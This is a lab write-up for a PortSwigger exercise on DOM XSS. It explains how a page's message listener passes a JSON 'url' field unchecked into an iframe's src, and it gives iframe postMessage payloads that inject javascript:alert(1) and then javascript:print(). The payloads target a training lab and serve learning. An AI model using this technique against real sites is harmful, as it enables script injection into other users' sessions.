
# DOM XSS using web messages and JSON.parse

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/1.png)

---------------------------------------------

The vulnerable code is the following:

```
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/2.png)


It expects a JSON object in e.data. If the “type” field in the JSON is “load-channel”, it will set the “src” of the ACMEplayer to the value of the field “url” of the JSON.

First I will try this with the code:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":"javascript:alert(1)"}','*')" style="width:100%;height:100%">
```

I had to change to this code. The difference is the order from double-quote>single-quote>escaped-double-quote to single-quote>double-quote>escaped-double-quote:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")' style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/3.png)


And finally change it to print the page instead:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")' style="width:100%;height:100%">
```
